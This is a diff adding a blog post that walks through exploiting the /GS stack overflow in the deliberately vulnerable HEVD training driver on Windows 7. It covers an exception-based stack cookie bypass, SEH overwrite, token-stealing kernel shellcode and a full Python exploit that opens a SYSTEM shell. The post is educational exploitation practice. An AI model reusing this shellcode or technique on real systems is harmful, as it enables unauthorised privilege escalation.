@@ -1,0 +1,319 @@
++++
+date = "2017-09-05"
+title = "HEVD Stack Overflow GS"
+tags = ["exploitation", "windows", "hevd"]
+categories = ["security", "exploitation", "windows"]
++++
+
+Lately, I've decided to play around with [HackSys Extreme Vulnerable Driver
+(HEVD)](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) for fun.
+It's a great way to familiarize yourself with Windows exploitation. In this
+blog post, I'll show how to exploit the stack overflow that is protected with
+[/GS stack
+cookies](https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check)
+on Windows 7 SP1 32 bit. You can find the [source code
+here](https://github.com/klue/hevd). It has a few more exploits written and a
+Win10 pre-anniversary version of the regular stack buffer overflow
+vulnerability.
+
+## Triggering the Vulnerable Function
+To start, we need to find the
+[ioctl](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363219(v=vs.85).aspx)
+dispatch routine in HEVD. Looking for the
+[`IRP_MJ_DEVICE_CONTROL`](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control)
+[IRP](https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/i-o-request-packets),
+we see that the dispatch function can be found at `hevd+508e`.
+```text
+kd> !drvobj hevd 2
+Driver object (852b77f0) is for:
+ \Driver\HEVD
+DriverEntry:   995cb129	HEVD
+DriverStartIo: 00000000	
+DriverUnload:  995ca016	HEVD
+AddDevice:     00000000	
+
+Dispatch routines:
+[00] IRP_MJ_CREATE                      995c9ff2	HEVD+0x4ff2
+[01] IRP_MJ_CREATE_NAMED_PIPE           995ca064	HEVD+0x5064
+...
+[0e] IRP_MJ_DEVICE_CONTROL              995ca08e	HEVD+0x508e
+[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     995ca064	HEVD+0x5064
+[10] IRP_MJ_SHUTDOWN                    995ca064	HEVD+0x5064
+[11] IRP_MJ_LOCK_CONTROL                995ca064	HEVD+0x5064
+[12] IRP_MJ_CLEANUP                     995ca064	HEVD+0x5064
+[13] IRP_MJ_CREATE_MAILSLOT             995ca064	HEVD+0x5064
+[14] IRP_MJ_QUERY_SECURITY              995ca064	HEVD+0x5064
+[15] IRP_MJ_SET_SECURITY                995ca064	HEVD+0x5064
+...
+```
+Finding the ioctl request number requires very light reverse engineering. We
+want to end up eventually at `hevd+515a`. At `hevd+50b4`, the request number is
+subtracted by `222003h`. If it was `222003h`, then jump to `hevd+5172`, or else
+fall through to `hevd+50bf`. In this basic block, our ioctl request number is
+subtracted by 4. If the result is 0, we are where we want to be. Therefore, our
+ioctl number should be `222007h`.
+![Finding ioctl number](/images/hevd_stack_gs-finding_ioctl_num.png)
+
+Eventually, a `memcpy` is reached where the calling function does not check the
+copy size.
+![Vulnerable code](/images/hevd_stack_gs-vulnerable_code.png)
+
+To give the overflow code a quick run, we call it with benign input using the
+code below. You can find the implementation of `mmap` and `write` in the full
+source code.
+```python
+def trigger_stackoverflow_gs(addr, size):
+    dwReturn = c_ulong()
+    driver_handle = kernel32.CreateFileW(DEVICE_NAME,
+                                         GENERIC_READ | GENERIC_WRITE,
+                                         0, None, OPEN_EXISTING, 0, None)
+    if not driver_handle or driver_handle == -1:
+        sys.exit()
+
+    print "[+] IOCTL: 0x222007"
+    dev_ioctl = kernel32.DeviceIoControl(driver_handle, 0x222007,
+                                         addr, size,
+                                         None, 0,
+                                         byref(dwReturn), None)
+
+m = mmap()
+write(m, 'A'*10)
+trigger_stackoverflow_gs(m, 10)
+```
+In WinDbg, the debug output confirms that we are calling the right ioctl. 
+
+<img src="/images/hevd_stack_gs-sample_run.png" width="60%" height="60%"/>
+
+From the figure, we can see that the kernel buffer is 0x200 in size so if we
+run a PoC again, but with 0x250 `A`s, we should overflow the stack cookie and
+blue screens our VM.
+
+![Overwriting stack cookie](/images/hevd_stack_gs-stack_cookie_overwrite_confirmation.png)
+
+Indeed, the bugcheck tells us that the system crashed due to a stack buffer
+overflow. Stack cookies in Windows are first XORed with `ebp` before they're
+stored on the stack. If we take the cookie in the bugcheck, and XOR it with
+`41414141`, the result should resemble a stack address. Specifically, it should
+be the stack base pointer for `hevd+48da`.
+```text
+kd> ? e9d25b91 ^ 41414141
+Evaluate expression: -1466754352 = a8931ad0
+```
+
+## Bypassing Stack Cookies
+A common way to bypass stack cookies, introduced by [David
+Litchfield](https://dl.packetstormsecurity.net/papers/bypass/defeating-w2k3-stack-protection.pdf),
+is to cause the program to throw an exception before the stack cookie is
+checked at the end of the function. This works because when an exception
+occurs, the stack cookie is not checked.
+> There are two ways [generating an exception] might happen--one we can control
+> and the other is dependent of the code of the vulnerable function. In the
+> latter case, if we overflow other data, for example parameters that were
+> pushed onto the stack to the vulnerable function and these are referenced
+> before the cookie check is performed then we could cause an exception here by
+> setting this data to something that will cause an exception. If the code of
+> the vulnerable function has been written in such a way that no opportunity
+> exists to do this, then we have to attempt to generate our own exception. We
+> can do this by attempting to write beyond the end of the stack.
+
+For us, it's easy because the vulnerable function uses `memcpy`. We can simply
+force `memcpy` to segfault by letting it continue copying the source buffer all
+the way to unmapped memory.
+
+I use my `mmap` function to map two adjacent pages, then `munmap` to unmap the
+second page. `mmap` and `munmap` are just simple wrappers I wrote for
+[`NtAllocateVirtualMemory`](https://msdn.microsoft.com/en-us/library/windows/hardware/ff566416(v=vs.85).aspx)
+and
+[`NtFreeVirtualMemory`](https://msdn.microsoft.com/en-us/library/windows/hardware/ff566460(v=vs.85).aspx)
+respectively. The idea is to place the source buffer at the end of the mapped
+page that was mapped, and have the vulnerable `memcpy` read off into the
+unmapped page to cause an exception.
+
+To test this, we'll use the PoC code below.
+```python
+m = mmap(size=0x2000)
+munmap(m+0x1000)
+
+trigger_stackoverflow_gs(m+0x1000-0x250, 0x251)
+```
+Back in the debugger, we can observe that an exception was thrown and `eip` was
+overwritten as a result of the exception handler being overwritten. 
+![Exception handler crash](/images/hevd_stack_gs-exception_handler_overwrite_confirmation.png)
+
+The next step is to find the offset of the `A`s so we can control `eip` to
+point to shellcode. You can use a binary search type way to find the offset,
+but an easier method is to use a [De Bruijn
+sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) as the payload. I
+usually use Metasploit's
+[`pattern_create.rb`](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb)
+and
+[`pattern_offset.rb`](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb)
+for finding the exact offset in my buffer.
+
+![Exception handler crash patter_create.rb](/images/hevd_stack_gs-pattern_create_crash.png)
+
+The figure above shows us `41367241` overwrites the exception handler address
+and so also `eip`.
+```text
+kd> .formats 41367241
+Evaluate expression:
+  Hex:     41367241
+  Decimal: 1094087233
+  Octal:   10115471101
+  Binary:  01000001 00110110 01110010 01000001
+  Chars:   A6rA
+  Time:    Wed Sep  1 18:07:13 2004
+  Float:   low 11.4029 high 0
+  Double:  5.40551e-315
+```
+
+Reversing the order due to endianness, we get `Ar6A` which `pattern_offset.rb`
+tells us is offset 528 (0x210). Therefore, our source buffer will be of size
+0x210+4, where the 4 is due to the address of our shellcode.
+
+## Constructing Shellcode
+Since there is 0x1000-0x210-4 unused space in our allocated page, we can just
+put our shellcode in the beginning of the page. I use common Windows token
+stealing shellcode that basically iterates through the `_EPROCESS`s, looks for
+the SYSTEM process, and copies the SYSTEM process' token. Additionally, for
+convenience in breaking at the shellcode, I prepend the shellcode with a
+breakpoint (`\xcc`).
+```text
+\xcc\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\x8b\x80\xb8\x00
+\x00\x00\x2d\xb8\x00\x00\x00\x83\xb8\xb4\x00\x00\x00\x04\x75\xec\x8b\x90\xf8
+\x00\x00\x00\x89\x91\xf8\x00\x00\x00
+```
+
+Our shellcode still isn't complete yet; the shellcode doesn't know where to
+return to after it executes. To search for a return address, let's inspect the
+call stack in the debugger when the shellcode executes.
+```text
+kd> k
+ # ChildEBP RetAddr
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+00 a88cf114 82ab3622 0x1540000
+01 a88cf138 82ab35f4 nt!ExecuteHandler2+0x26
+02 a88cf15c 82ae73b5 nt!ExecuteHandler+0x24
+03 a88cf1f0 82af005c nt!RtlDispatchException+0xb6
+04 a88cf77c 82a79dd6 nt!KiDispatchException+0x17c
+05 a88cf7e4 82a79d8a nt!CommonDispatchException+0x4a
+06 a88cf868 995c9969 nt!KiExceptionExit+0x192
+07 a88cf86c a88cf8b4 HEVD+0x4969
+08 a88cf870 01540dec 0xa88cf8b4
+09 a88cf8b4 41414141 0x1540dec
+0a a88cf8b8 41414141 0x41414141
+0b a88cf8bc 41414141 0x41414141
+...
+51 a88cfad0 995c99ca 0x41414141
+52 a88cfae0 995ca16d HEVD+0x49ca
+53 a88cfafc 82a72593 HEVD+0x516d
+54 a88cfb14 82c6699f nt!IofCallDriver+0x63
+```
+
+`hevd+4969` is the instruction address after the `memcpy`, but we can't return
+here because the portion of stack the remaining code uses  is corrupted. Fixing
+the stack to the correct values would be extremely annoying. Instead, returning
+to `hevd+49ca` which is the return address of the stack frame right below
+`hevd+4969` makes more sense.
+
+However, if you adjust the stack and return to `hevd+49ca`, you'll still get a
+crash. The problem is at `hevd+5260` where `edi+0x1c` is dereferenced. `edi` at
+this point is 0 because registers are XORed with themselves before the
+exception handler assumes control and neither the program nor our shellcode
+touched `edi`. 
+
+<center>
+<img src="/images/hevd_stack_gs-__SEH_epilog4.png" width="40%" height="40%"/>
+</center>
+
+In a normal execution, `edi` and other registers are restored in
+`__SEH_epilog4`. These values are of course restored from the stack. Taking
+`a88cf86c` from the stack trace before, we can dump and attempt to find the
+restore values. They're actually are quite easy to find here because
+`hevd+5dcc` is quite easy to spot. `hevd+5dcc` is the address of the debug
+print string which is restored into `ebx`.
+```text
+kd> dds a88cf86c
+a88cf86c  995c9969 HEVD+0x4969
+a88cf870  a88cf8b4
+a88cf874  01540dec
+a88cf878  00000218
+a88cf87c  995ca760 HEVD+0x5760
+a88cf880  995ca31a HEVD+0x531a
+a88cf884  00000200
+a88cf888  995ca338 HEVD+0x5338
+a88cf88c  a88cf8b4
+a88cf890  995ca3a2 HEVD+0x53a2
+a88cf894  00000218
+a88cf898  995ca3be HEVD+0x53be
+a88cf89c  01540dec
+a88cf8a0  31d15d0b
+a88cf8a4  8c843f68 <-- edi
+a88cf8a8  8c843fd8 <-- esi
+a88cf8ac  995cadcc HEVD+0x5dcc <-- ebx
+a88cf8b0  455f5359
+a88cf8b4  41414141
+a88cf8b8  41414141
+```
+
+To obtain the offset of `edi`, just subtract `esp` from the current address of
+the restore value.
+```text
+kd> ? a88cf8a4 - esp
+Evaluate expression: 1932 = 0000078c
+kd> dds a88cfad0 la
+a88cfad0  a88cfae0
+a88cfad4  995c99ca HEVD+0x49ca
+a88cfad8  01540dec
+a88cfadc  00000218
+a88cfae0  a88cfafc
+a88cfae4  995ca16d HEVD+0x516d
+a88cfae8  8c843f68
+a88cfaec  8c843fd8
+a88cfaf0  86c3c398
+a88cfaf4  8586f5f0
+kd> ? a88cfad0 - esp
+Evaluate expression: 2488 = 000009b8
+```
+Similarly, finding the offset to return to is found by obtaining the difference
+of `a88cfad0` and `esp`.
+
+Lastly, our shellcode should `pop ebp; ret 8;` which results in 
+```text
+start:
+  xor eax, eax;
+  mov eax,dword ptr fs:[eax+0x124]; # nt!_KPCR.PcrbData.CurrentThread
+  mov eax,dword ptr [eax+0x50];     # nt!_KTHREAD.ApcState.Process
+  mov ecx,eax;                      # Store unprivileged _EPROCESS in ecx
+loop:
+  mov eax,dword ptr [eax+0xb8];     # Next nt!_EPROCESS.ActiveProcessLinks.Flink
+  sub eax, 0xb8;                    # Back to the beginning of _EPROCESS
+  cmp dword ptr [eax+0xb4],0x04;    # SYSTEM process? nt!_EPROCESS.UniqueProcessId
+  jne loop;
+stealtoken:
+  mov edx,dword ptr [eax+0xf8];     # Get SYSTEM nt!_EPROCESS.Token
+  mov dword ptr [ecx+0xf8],edx;     # Copy token
+restore:
+  mov edi, [esp+0x78c];             # edi irq
+  mov esi, [esp+0x790];             # esi
+  mov ebx, [esp+0x794];             # move print string into ebx
+  add esp, 0x9b8;
+  pop ebp;
+  ret 0x8;
+```
+## Gaining NT Authority\SYSTEM
+Putting everything together, the final exploit looks like this.
+```python
+m = mmap(size=0x2000)
+munmap(m+0x1000)
+size = 0x210+4
+
+sc = '\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x83\xb8\xb4\x00\x00\x00\x04\x75\xec\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x8b\xbc\x24\x8c\x07\x00\x00\x8b\xb4\x24\x90\x07\x00\x00\x8b\x9c\x24\x94\x07\x00\x00\x81\xc4\xb8\x09\x00\x00\x5d\xc2\x08\x00'
+write(m, sc + 'A'*(0x1000-4-len(sc)) + struct.pack("<I", m))
+trigger_stackoverflow_gs(m+0x1000-size, size+1)
+
+print '\n[+] Privilege Escalated\n'
+os.system('cmd.exe')
+```
+And that should give us:
+![nt authority\system](/images/hevd_stack_gs-priv_esc.png)
